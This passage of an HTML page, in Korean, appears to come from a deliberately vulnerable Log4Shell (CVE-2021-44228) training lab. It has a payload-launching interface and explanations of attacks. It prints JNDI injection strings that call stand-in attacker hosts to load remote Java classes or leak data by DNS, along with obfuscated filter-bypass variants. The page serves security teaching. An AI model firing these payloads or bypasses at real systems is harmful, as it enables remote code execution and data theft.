                background: linear-gradient(135deg, var(--vuln-danger), #e67e22);
                border: none;
                border-radius: 10px;
                color: white;
                padding: 0.8rem 1.5rem;
                margin: 0.3rem;
                font-weight: bold;
                transition: all 0.3s ease;
                cursor: pointer;
            }
    
            .payload-btn:hover {
                transform: translateY(-3px);
                box-shadow: 0 8px 15px rgba(231, 76, 60, 0.3);
            }
    
            .log-terminal {
                background: #000;
                color: #00ff00;
                font-family: 'Courier New', monospace;
                border-radius: 10px;
                padding: 1.5rem;
                max-height: 400px;
                overflow-y: auto;
                border: 2px solid #333;
                font-size: 0.9rem;
                line-height: 1.4;
            }
    
            .log-entry {
                margin-bottom: 0.5rem;
                word-wrap: break-word;
            }
    
            .log-info { color: #00ff00; }
            .log-warn { color: #ffff00; }
            .log-error { color: #ff4444; }
            .log-attack { color: #ff6b6b; background: rgba(255, 107, 107, 0.1); padding: 0.2rem; }
    
            .step-card {
                background: white;
                border-radius: 15px;
                padding: 1.5rem;
                margin-bottom: 1.5rem;
                box-shadow: 0 4px 15px rgba(0,0,0,0.08);
                border-left: 5px solid var(--vuln-secondary);
                transition: transform 0.3s ease;
            }
    
            .step-card:hover {
                transform: translateY(-3px);
            }
    
            .step-number {
                background: var(--vuln-secondary);
                color: white;
                width: 40px;
                height: 40px;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                font-weight: bold;
                margin-right: 1rem;
            }
    
            .progress-tracker {
                background: white;
                border-radius: 15px;
                padding: 1.5rem;
                margin-bottom: 2rem;
                box-shadow: 0 4px 15px rgba(0,0,0,0.08);
            }
    
            .progress-step {
                display: flex;
                align-items: center;
                margin-bottom: 1rem;
                padding: 1rem;
                border-radius: 10px;
                transition: all 0.3s ease;
            }
    
            .progress-step.completed {
                background: rgba(39, 174, 96, 0.1);
                border-left: 4px solid var(--vuln-success);
            }
    
            .progress-step.active {
                background: rgba(241, 196, 15, 0.1);
                border-left: 4px solid var(--vuln-warning);
            }
    
            .progress-step.pending {
                background: rgba(149, 165, 166, 0.1);
                border-left: 4px solid #95a5a6;
            }
    
            .attack-demo {
                background: linear-gradient(135deg, #2c3e50, #34495e);
                color: white;
                border-radius: 15px;
                padding: 2rem;
                margin: 2rem 0;
            }
    
            .demo-terminal {
                background: #1a1a1a;
                border-radius: 10px;
                padding: 1rem;
                margin: 1rem 0;
                font-family: 'Courier New', monospace;
                color: #00ff00;
                max-height: 300px;
                overflow-y: auto;
            }
    
            .severity-critical { border-left-color: #e74c3c !important; background: rgba(231, 76, 60, 0.05); }
            .severity-high { border-left-color: #f39c12 !important; background: rgba(243, 156, 18, 0.05); }
            .severity-medium { border-left-color: #f1c40f !important; background: rgba(241, 196, 15, 0.05); }
            .severity-low { border-left-color: #3498db !important; background: rgba(52, 152, 219, 0.05); }
    
            .floating-alerts {
                position: fixed;
                top: 100px;
                right: 20px;
                z-index: 1050;
                max-width: 350px;
            }
    
            .detection-alert {
                background: rgba(231, 76, 60, 0.9);
                color: white;
                border-radius: 10px;
                padding: 1rem;
                margin-bottom: 0.5rem;
                animation: slideInRight 0.5s ease;
            }
    
            @keyframes slideInRight {
                from { transform: translateX(100%); opacity: 0; }
                to { transform: translateX(0); opacity: 1; }
            }
    
            .code-block {
                background: #2d2d2d;
                color: #f8f8f2;
                border-radius: 10px;
                padding: 1rem;
                margin: 1rem 0;
                font-family: 'Courier New', monospace;
                font-size: 0.9rem;
                overflow-x: auto;
            }
    
            .nav-pills .nav-link.active {
                background: var(--vuln-danger);
            }
    
            .badge-vuln {
                background: var(--vuln-danger);
                color: white;
                padding: 0.4rem 0.8rem;
                border-radius: 15px;
                font-size: 0.8rem;
            }
        </style>
    </head>
    <body>
        <!-- Floating Alerts Container -->
        <div class="floating-alerts" id="floatingAlerts"></div>
    
        <!-- Navigation -->
        <nav class="navbar navbar-expand-lg navbar-dark" style="background: rgba(44, 62, 80, 0.9);">
            <div class="container">
                <a class="navbar-brand" href="/">
                    <i class="fas fa-truck-moving me-2"></i>
                    SecureLogistics
                </a>
                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
                    <span class="navbar-toggler-icon"></span>
                </button>
                <div class="collapse navbar-collapse" id="navbarNav">
                    <ul class="navbar-nav me-auto">
                        <li class="nav-item">
                            <a class="nav-link" href="/">
                                <i class="fas fa-home me-1"></i>대시보드
                            </a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="/warehouse">
                                <i class="fas fa-warehouse me-1"></i>입고관리
                            </a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="/inventory">
                                <i class="fas fa-boxes me-1"></i>재고조회
                            </a>
                        </li>
                    </ul>
                    <ul class="navbar-nav">
                        <li class="nav-item">
                            <a class="nav-link active" href="/vulnerable">
                                <i class="fas fa-bug me-1"></i>취약점 실습
                                <span class="badge bg-danger ms-1">LAB</span>
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
        </nav>
    
        <!-- Header -->
        <section class="vuln-header">
            <div class="container">
                <div class="row align-items-center">
                    <div class="col-md-8">
                        <h1 class="display-4 fw-bold">
                            <i class="fas fa-bug me-3"></i>Log4j 취약점 실습실
                        </h1>
                        <p class="lead">CVE-2021-44228 (Log4Shell) 취약점을 안전하게 학습하고 실습하세요</p>
                        <div class="mt-3">
                            <span class="badge badge-vuln me-2">
                                <i class="fas fa-exclamation-triangle me-1"></i>CRITICAL
                            </span>
                            <span class="badge badge-vuln me-2">
                                <i class="fas fa-shield-alt me-1"></i>CVE-2021-44228
                            </span>
                            <span class="badge badge-vuln">
                                <i class="fas fa-graduation-cap me-1"></i>EDUCATIONAL
                            </span>
                        </div>
                    </div>
                    <div class="col-md-4 text-end">
                        <div class="text-white">
                            <h4><i class="fas fa-crosshairs me-2"></i>위험도</h4>
                            <h2 class="fw-bold">10.0</h2>
                            <small>CVSS 최고 등급</small>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    
        <div class="container">
            <!-- Warning Banner -->
            <div class="warning-banner">
                <div class="row align-items-center">
                    <div class="col-md-8">
                        <h3 class="mb-2">
                            <i class="fas fa-exclamation-triangle me-2"></i>
                            ⚠️ 교육 전용 취약점 실습 환경 ⚠️
                        </h3>
                        <p class="mb-0">이 환경은 Log4j 취약점 학습을 위해 의도적으로 취약하게 구성되었습니다.</p>
                        <small><strong>주의:</strong> 실제 운영 환경에서는 절대 사용하지 마세요!</small>
                    </div>
                    <div class="col-md-4 text-end">
                        <button class="btn btn-outline-light btn-lg" onclick="showSafetyGuide()">
                            <i class="fas fa-shield-alt me-2"></i>안전 수칙
                        </button>
                    </div>
                </div>
            </div>
    
            <!-- Progress Tracker -->
            <div class="progress-tracker">
                <h5 class="fw-bold mb-3">
                    <i class="fas fa-tasks me-2"></i>실습 진행 상황
                </h5>
                <div id="progressSteps">
                    <div class="progress-step pending" data-step="1">
                        <div class="step-number">1</div>
                        <div>
                            <h6 class="mb-1">취약점 이해</h6>
                            <small class="text-muted">Log4j JNDI Injection 원리 학습</small>
                        </div>
                    </div>
                    <div class="progress-step pending" data-step="2">
                        <div class="step-number">2</div>
                        <div>
                            <h6 class="mb-1">기본 공격 실습</h6>
                            <small class="text-muted">LDAP, RMI, DNS 공격 패턴 테스트</small>
                        </div>
                    </div>
                    <div class="progress-step pending" data-step="3">
                        <div class="step-number">3</div>
                        <div>
                            <h6 class="mb-1">우회 기법 실습</h6>
                            <small class="text-muted">필터링 우회 및 난독화 기법</small>
                        </div>
                    </div>
                    <div class="progress-step pending" data-step="4">
                        <div class="step-number">4</div>
                        <div>
                            <h6 class="mb-1">탐지 및 대응</h6>
                            <small class="text-muted">공격 탐지 방법 및 보안 대책</small>
                        </div>
                    </div>
                </div>
            </div>
    
            <!-- Main Lab Content -->
            <div class="row">
                <div class="col-lg-8">
                    <!-- Navigation Tabs -->
                    <ul class="nav nav-pills mb-4" id="labTabs" role="tablist">
                        <li class="nav-item" role="presentation">
                            <button class="nav-link active" id="basic-tab" data-bs-toggle="pill" data-bs-target="#basic-attacks" type="button">
                                <i class="fas fa-play me-2"></i>기본 공격
                            </button>
                        </li>
                        <li class="nav-item" role="presentation">
                            <button class="nav-link" id="advanced-tab" data-bs-toggle="pill" data-bs-target="#advanced-attacks" type="button">
                                <i class="fas fa-rocket me-2"></i>고급 공격
                            </button>
                        </li>
                        <li class="nav-item" role="presentation">
                            <button class="nav-link" id="detection-tab" data-bs-toggle="pill" data-bs-target="#detection" type="button">
                                <i class="fas fa-search me-2"></i>탐지 분석
                            </button>
                        </li>
                        <li class="nav-item" role="presentation">
                            <button class="nav-link" id="defense-tab" data-bs-toggle="pill" data-bs-target="#defense" type="button">
                                <i class="fas fa-shield-alt me-2"></i>방어 기법
                            </button>
                        </li>
                    </ul>
    
                    <!-- Tab Content -->
                    <div class="tab-content" id="labTabContent">
                        <!-- Basic Attacks -->
                        <div class="tab-pane fade show active" id="basic-attacks" role="tabpanel">
                            <div class="lab-container">
                                <h4 class="fw-bold mb-3">
                                    <i class="fas fa-bomb me-2 text-danger"></i>기본 JNDI Injection 공격
                                </h4>
                                
                                <div class="attack-section">
                                    <h6 class="text-white mb-3">
                                        <i class="fas fa-terminal me-2"></i>공격 실행 영역
                                    </h6>
                                    
                                    <div class="mb-3">
                                        <label class="form-label text-white">공격 대상 선택</label>
                                        <select class="form-select attack-input" id="attackTarget">
                                            <option value="/api/vulnerable/log-input">직접 입력 로깅</option>
                                            <option value="/api/boards/search">게시판 검색</option>
                                            <option value="/api/users/search">사용자 검색</option>
                                            <option value="/api/vulnerable/log-headers">HTTP 헤더 로깅</option>
                                        </select>
                                    </div>
                                    
                                    <div class="mb-3">
                                        <label class="form-label text-white">공격 페이로드 입력</label>
                                        <textarea class="form-control attack-input" id="attackPayload" rows="3" 
                                                 placeholder="JNDI 공격 패턴을 입력하거나 아래 버튼을 클릭하세요..."></textarea>
                                    </div>
                                    
                                    <div class="mb-3">
                                        <h6 class="text-white mb-2">미리 정의된 공격 패턴</h6>
                                        <button class="payload-btn" onclick="setPayload('ldap')">
                                            <i class="fas fa-bolt me-1"></i>LDAP 공격
                                        </button>
                                        <button class="payload-btn" onclick="setPayload('rmi')">
                                            <i class="fas fa-satellite me-1"></i>RMI 공격
                                        </button>
                                        <button class="payload-btn" onclick="setPayload('dns')">
                                            <i class="fas fa-globe me-1"></i>DNS 유출
                                        </button>
                                        <button class="payload-btn" onclick="setPayload('http')">
                                            <i class="fas fa-link me-1"></i>HTTP 요청
                                        </button>
                                    </div>
                                    
                                    <div class="text-center">
                                        <button class="btn btn-danger btn-lg" onclick="executeAttack()">
                                            <i class="fas fa-crosshairs me-2"></i>공격 실행
                                        </button>
                                        <button class="btn btn-outline-light ms-2" onclick="clearLogs()">
                                            <i class="fas fa-trash me-2"></i>로그 초기화
                                        </button>
                                    </div>
                                </div>
    
                                <!-- Code Examples -->
                                <div class="mt-4">
                                    <h6 class="fw-bold">📋 공격 패턴 설명</h6>
                                    <div class="accordion" id="attackExamples">
                                        <div class="accordion-item">
                                            <h2 class="accordion-header">
                                                <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#ldap-example">
                                                    LDAP 공격 (가장 일반적)
                                                </button>
                                            </h2>
                                            <div id="ldap-example" class="accordion-collapse collapse show">
                                                <div class="accordion-body">
                                                    <div class="code-block">
    <pre><code>${jndi:ldap://attacker.com/exploit}
    
    # 동작 원리:
    1. Log4j가 ${jndi:...} 패턴을 감지
    2. LDAP 서버(attacker.com)에 연결 시도  
    3. 악의적인 Java 클래스 다운로드 및 실행
    4. 시스템 완전 장악 가능</code></pre>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        
                                        <div class="accordion-item">
                                            <h2 class="accordion-header">
                                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#rmi-example">
                                                    RMI 공격
                                                </button>
                                            </h2>
                                            <div id="rmi-example" class="accordion-collapse collapse">
                                                <div class="accordion-body">
                                                    <div class="code-block">
    <pre><code>${jndi:rmi://malicious.server:1099/payload}
    
    # 특징:
    - Java RMI(Remote Method Invocation) 프로토콜 사용
    - 기본 포트: 1099
    - 직접 Java 객체 실행 가능</code></pre>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        
                                        <div class="accordion-item">
                                            <h2 class="accordion-header">
                                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#dns-example">
                                                    DNS 데이터 유출
                                                </button>
                                            </h2>
                                            <div id="dns-example" class="accordion-collapse collapse">
                                                <div class="accordion-body">
                                                    <div class="code-block">
    <pre><code>${jndi:dns://exfiltrate.attacker.com/data}
    
    # 목적:
    - 시스템 정보 유출
    - 환경 변수 획득
    - 네트워크 연결 확인</code></pre>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
    
                        <!-- Advanced Attacks -->
                        <div class="tab-pane fade" id="advanced-attacks" role="tabpanel">
                            <div class="lab-container">
                                <h4 class="fw-bold mb-3">
                                    <i class="fas fa-rocket me-2 text-warning"></i>고급 우회 기법
                                </h4>
                                
                                <div class="step-card severity-high">
                                    <div class="d-flex">
                                        <div class="step-number">1</div>
                                        <div>
                                            <h6 class="fw-bold">대소문자 우회</h6>
                                            <div class="code-block mt-2">
    <pre><code>${${lower:jndi}:${lower:ldap}://evil.com/exploit}</code></pre>
                                            </div>
                                            <button class="btn btn-warning btn-sm mt-2" onclick="setPayload('bypass1')">
                                                <i class="fas fa-copy me-1"></i>테스트
                                            </button>
                                        </div>
                                    </div>
                                </div>
    
                                <div class="step-card severity-high">
                                    <div class="d-flex">
                                        <div class="step-number">2</div>
                                        <div>
                                            <h6 class="fw-bold">환경변수 우회</h6>
                                            <div class="code-block mt-2">
    <pre><code>${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}</code></pre>
                                            </div>
                                            <button class="btn btn-warning btn-sm mt-2" onclick="setPayload('bypass2')">
                                                <i class="fas fa-copy me-1"></i>테스트
                                            </button>
                                        </div>
                                    </div>
                                </div>
    
                                <div class="step-card severity-critical">
                                    <div class="d-flex">
                                        <div class="step-number">3</div>
                                        <div>
                                            <h6 class="fw-bold">중첩 표현식 우회</h6>
                                            <div class="code-block mt-2">
    <pre><code>${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/exploit}</code></pre>
                                            </div>
                                            <button class="btn btn-danger btn-sm mt-2" onclick="setPayload('bypass3')">
                                                <i class="fas fa-copy me-1"></i>테스트
                                            </button>
                                        </div>
                                    </div>
                                </div>
    
                                <div class="step-card severity-medium">
                                    <div class="d-flex">
                                        <div class="step-number">4</div>
                                        <div>
                                            <h6 class="fw-bold">Base64 인코딩 우회</h6>
                                            <div class="code-block mt-2">
    <pre><code>${jndi:ldap://base64.evil.com/${base64:dGVzdA==}}</code></pre>
                                            </div>
                                            <button class="btn btn-info btn-sm mt-2" onclick="setPayload('bypass4')">
                                                <i class="fas fa-copy me-1"></i>테스트
                                            </button>
                                        </div>
                                    </div>
                                </div>
    
                                <div class="attack-demo">
                                    <h5 class="fw-bold mb-3">
                                        <i class="fas fa-flask me-2"></i>우회 기법 실습
                                    </h5>
                                    <p>위의 우회 기법들은 WAF(Web Application Firewall)나 간단한 필터링을 우회하기 위해 사용됩니다.</p>
                                    
                                    <div class="row">
                                        <div class="col-md-6">
                                            <h6>탐지되는 패턴:</h6>
                                            <div class="code-block">
    <pre><code class="language-bash"># 기본 패턴 (쉽게 탐지됨)
    ${jndi:ldap://
    ${jndi:rmi://
    ${jndi:dns://</code></pre>
                                            </div>
                                        </div>
                                        <div class="col-md-6">
                                            <h6>우회 패턴:</h6>
                                            <div class="code-block">
    <pre><code class="language-bash"># 우회 성공 가능성 높음
    ${${lower:j}ndi:ldap://
    ${j${k8s:k5:-ndi:l}dap://
    ${${::-j}${::-n}${::-d}${::-i}: